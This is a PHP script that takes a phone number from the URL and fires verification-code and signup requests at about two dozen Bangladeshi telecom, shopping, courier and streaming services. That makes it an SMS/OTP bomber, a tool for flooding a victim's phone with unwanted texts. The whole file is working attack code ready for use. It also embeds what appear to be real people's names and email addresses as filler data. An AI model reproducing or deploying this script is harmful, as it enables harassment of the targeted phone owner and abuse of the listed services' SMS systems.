<?php
// Get the number from query parameters
$number = $_GET['number'];

// List of URLs and associated POST data
$urls = [
    [
        "url" => "http://206.189.134.221/wordpress/wp-content/uploads/bmb/01616685690",
        "postData" => null
    ],
    [
        "url" => "https://cokestudio23.sslwireless.com/api/store-and-send-otp",
        "postData" => json_encode(["msisdn" => "880{$number}", "name" => "Aulad Hosen", "email" => "uladhosenridoy@gmail.com", "dob" => "2000-01-01", "occupation" => "N/A", "gender" => "male"])
    ],
    [
        "url" => "https://cokestudio23.sslwireless.com/api/check-gp-number",
        "postData" => json_encode(["msisdn" => "{$number}"])
    ],
    [
        "url" => "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "postData" => json_encode(["msisdn" => "{$number}"])
    ],
    [
        "url" => "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "postData" => json_encode(["mobile" => "+880{$number}"])
    ],
    [
        "url" => "https://api.osudpotro.com/api/v1/users/send_otp",
        "postData" => json_encode(["mobile" => "+88-{$number}", "deviceToken" => "web", "language" => "en", "os" => "web"])
    ],
    [
        "url" => "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
        "postData" => json_encode(["msisdn" => "{$number}"])
    ],
    [
        "url" => "https://api.swap.com.bd/api/v1/send-otp",
        "postData" => json_encode(["phone" => "{$number}"])
    ],
    [
        "url" => "https://api.bd.airtel.com/v1/account/login/otp",
        "postData" => json_encode(["phone_number" => "{$number}"])
    ],
    [
        "url" => "https://api.bd.airtel.com/v1/account/register/otp",
        "postData" => null
    ],
    [
        "url" => "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        "postData" => json_encode(["mobile" => "+880{$number}"])
    ],
    [
        "url" => "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "postData" => null,
        "queryParams" => ["phone" => "{$number}"]
    ],
    [
        "url" => "https://www.rokomari.com/otp/send",
        "postData" => null,
        "queryParams" => ["emailOrPhone" => "880{$number}", "countryCode" => "BD"]
    ],
    [
        "url" => "https://backoffice.ecourier.com.bd/api/web/individual-send-otp",
        "postData" => null,
        "queryParams" => ["mobile" => "0{$number}"]
    ],
    [
        "url" => "https://m.cricbuzz.com/cbplus/auth/user/signup",
        "postData" => json_encode(["username" => "ajajsjfhcj@gmail.com"])
    ],
    [
        "url" => "https://api.paragonfood.com.bd/auth/customerlogin",
        "postData" => json_encode(["emailOrPhone" => "ajajsjfhcj@gmail.com"])
    ],
    [
        "url" => "https://prod-api.viewlift.com/identity/signup?site=prothomalo",
        "postData" => json_encode(["requestType" => "send", "phoneNumber" => "+880{$number}", "emailConsent" => true, "whatsappConsent" => false])
    ],
    [
        "url" => "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
        "postData" => json_encode(["requestType" => "send", "phoneNumber" => "+880{$number}", "emailConsent" => true, "whatsappConsent" => true])
    ],
    [
        "url" => "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
        "postData" => json_encode(["full_name" => "Hjbdnd", "company_name" => "Hello", "email_address" => "uladhosen860@gmail.com", "phone_number" => "{$number}"])
    ],
    [
        "url" => "https://app.eonbazar.com/api/auth/register",
        "postData" => json_encode(["mobile" => "{$number}", "name" => "Hello", "password" => "helloq", "email" => "ajajsjfhcj@gmail.com"])
    ],
    [
        "url" => "https://tracking.sundarbancourierltd.com/PreBooking/SendPin",
        "postData" => json_encode(["PreBookingRegistrationPhoneNumber" => "{$number}"])
    ],
    [
        "url" => "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername",
        "postData" => json_encode(["PreBookingRegistrationUsername" => "{$number}"])
    ],
    [
        "url" => "https://www.1024tera.com/wap/outlogin/phoneRegister",
        "postData" => null,
        "queryParams" => [
            "selectStatus" => "true",
            "redirectUrl" => "https://www.1024tera.com/wap/share/filelist?surl=dQNejqBF1OCapDm13KUTmw&download=0&fid=972890959747953&shareid=2583951647&from=4401900404091"
        ]
    ]
];

// Function to send GET or POST request
function sendRequest($url, $postData = null, $queryParams = null) {
    $ch = curl_init();

    if ($queryParams) {
        $url .= '?' . http_build_query($queryParams);
    }

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }

    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [
        "url" => $url,
        "httpcode" => $httpcode,
        "response" => $response
    ];
}

// Fetch data from all URLs
$results = [];

foreach ($urls as $entry) {
    $result = sendRequest($entry['url'], $entry['postData'] ?? null, $entry['queryParams'] ?? null);
    $results[] = $result;
}

// Print the results
header('Content-Type: application/json');
echo json_encode($results, JSON_PRETTY_PRINT);
?>
